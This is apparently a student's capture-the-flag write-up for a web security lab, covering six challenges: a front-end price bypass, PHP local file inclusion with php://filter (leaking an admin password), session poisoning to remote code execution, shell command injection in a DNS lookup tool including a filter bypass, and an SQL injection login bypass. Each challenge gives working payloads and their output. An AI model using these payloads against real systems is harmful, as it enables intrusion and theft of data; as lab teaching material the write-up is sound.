# 0x02 Web Lab Writeup

## Cat shop [20]

點進[網址](http://splitline.tw:8100)後可以看到有個 `FLAG` 選項是可以選的，但在前端頁面中是被 Disabled 掉的：

![Cat shop Homepage](./resources/Screen%20Shot%202021-10-28%20at%202.51.04%20PM.png)

仔細觀察一下頁面中其他選項可以看到這幾個商品都是有個 id 的，而且 id 數字有個非常明顯的順序，所以我們可以合理推斷 FLAG 這個商品的 id 是 `5430`。接下來觀察一下購買頁面可以發現送出的 Payload 中有夾帶 id 這一項及該 item 的金額數量，看起來**物品資訊是記在前端的**，運氣好的話可以直接透過修改 payload 的數值達到 bypass frontend restriction 的目的。

![Cat shop Buying Page](./resources/Screen%20Shot%202021-10-28%20at%202.59.21%20PM.png)

## 喵 site [20]

LFI 的問題。調整 `page` query 後後臺會跳出 include 的錯誤訊息：

![Site LFI Leak Error Message](./resources/Screen%20Shot%202021-10-28%20at%203.01.37%20PM.png)

所以透過 `php://filter` 可以撈出 admin.php 的原始碼：

```php
# Request http://splitline.tw:8400/?page=php://filter/read=convert.base64-encode/resource=admin

# PGgxPkFkbWluIFBhbmVsPC9oMT4KPGZvcm0+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSJhZG1pbiI+CiAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAokYWRtaW5fYWNjb3VudCA9IGFycmF5KCJ1c2VybmFtZSIgPT4gImFkbWluIiwgInBhc3N3b3JkIiA9PiAia3FxUEZPYnd4VThIWW84RTVRZ05MaGRPeHZabXRQaHlCQ3lEeEN3cHZBUSIpOwppZiAoCiAgICBpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pICYmCiAgICAkX0dFVFsndXNlcm5hbWUnXSA9PT0gJGFkbWluX2FjY291bnRbJ3VzZXJuYW1lJ10gJiYgJF9HRVRbJ3Bhc3N3b3JkJ10gPT09ICRhZG1pbl9hY2NvdW50WydwYXNzd29yZCddCikgewogICAgZWNobyAiPGgxPkxPR0lOIFNVQ0NFU1MhPC9oMT48cD4iLmdldGVudignRkxBRycpLiI8L3A+IjsKfQoKPz4=

# Decode
<h1>Admin Panel</h1>
<form>
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
    <input type="submit" value="Submit">
</form>

<?php
$admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ");
if (
    isset($_GET['username']) && isset($_GET['password']) &&
    $_GET['username'] === $admin_account['username'] && $_GET['password'] === $admin_account['password']
) {
    echo "<h1>LOGIN SUCCESS!</h1><p>".getenv('FLAG')."</p>";
}

?>
```

## HakkaMD [20]

這題也是 LFI 的問題，但這次目標除了讀出 Source Code 以外，還要達成 RCE 的目的。有問題的 Query 是 `module`，裡面填得值會直接丟到 `include` 裡。以下是三個頁面的 Source Code

```php
# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/list.php
<h1 class="title">筆記列表</h1>
<?php foreach ($_SESSION['notes'] as $note) : ?>
    <div class="box">
        <?= nl2br($note) ?>
    </div>
<?php endforeach; ?>
```

```php
# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/home.php
<div class="box">
    <h1 class="title">HakkaMD</h1>
    <p class="subtitle">一個簡單的筆記平台</p>
    <form method="POST" action="/?module=module/post.php">
        <div class="field">
            <div class="control">
                <textarea class="textarea" type="text" name="note" placeholder="Write your note here..."></textarea>
            </div>
        </div>
        <button class="button is-info is-fullwidth">Post</button>
    </form>
</div>
```

```php
# http://splitline.tw:8401/?module=php://filter/read=convert.base64-encode/resource=module/post.php
<?php
if (isset($_POST['note'])) $_SESSION['notes'][] = $_POST['note'];
header("Location: /?module=module/list.php");
```

這幾個檔案就可以看到，我們輸進去 textbox 的東西會存在 session 裡，所以我們只要想辦法 poison session 的檔案就行了。

```
http://splitline.tw:8401/?module=/tmp/sess_fc55d1565cd147368b5db214476fd776&cmd=cat%20%2Fflag_aff6136bbef82137
```

## DNS Lookup Tool [5]

```txt
Payload: '; ls -al /; cat /flag_44ebd3936a907d59; #
Output:
total 84
drwxr-xr-x   1 root root 4096 Oct 22 04:36 .
drwxr-xr-x   1 root root 4096 Oct 22 04:36 ..
-rwxr-xr-x   1 root root    0 Oct 22 04:36 .dockerenv
drwxr-xr-x   1 root root 4096 Aug 18 12:33 bin
drwxr-xr-x   2 root root 4096 Apr 10  2021 boot
drwxr-xr-x   5 root root  340 Oct 22 04:36 dev
drwxr-xr-x   1 root root 4096 Oct 22 04:36 etc
-rw-r--r--   1 1000 1000   29 Oct 22 01:27 flag_44ebd3936a907d59
drwxr-xr-x   2 root root 4096 Apr 10  2021 home
drwxr-xr-x   1 root root 4096 Aug 18 12:27 lib
drwxr-xr-x   2 root root 4096 Aug 16 00:00 lib64
drwxr-xr-x   2 root root 4096 Aug 16 00:00 media
drwxr-xr-x   2 root root 4096 Aug 16 00:00 mnt
drwxr-xr-x   2 root root 4096 Aug 16 00:00 opt
dr-xr-xr-x 295 root root    0 Oct 22 04:36 proc
drwx------   1 root root 4096 Aug 26 23:37 root
drwxr-xr-x   1 root root 4096 Aug 18 12:33 run
drwxr-xr-x   1 root root 4096 Aug 18 12:33 sbin
drwxr-xr-x   2 root root 4096 Aug 16 00:00 srv
dr-xr-xr-x  13 root root    0 Oct 22 04:36 sys
drwxrwxrwt   1 root root 4096 Oct 14 11:45 tmp
drwxr-xr-x   1 root root 4096 Aug 16 00:00 usr
drwxr-xr-x   1 root root 4096 Aug 18 12:27 var
FLAG{B4by_c0mmand_1njection!}
```

## DNS Lookup Tool WAF [25]

```txt
Payload: '+$(cat /fla*)+'
Output:
Host +FLAG{Y0U_\$\(Byp4ssed\)_th3_`waf`}+ not found: 2(SERVFAIL)
```

## Log me in [5]

Sqli

```txt
Payload username = ') or 1=1; --
Payload password = fsdaf
```
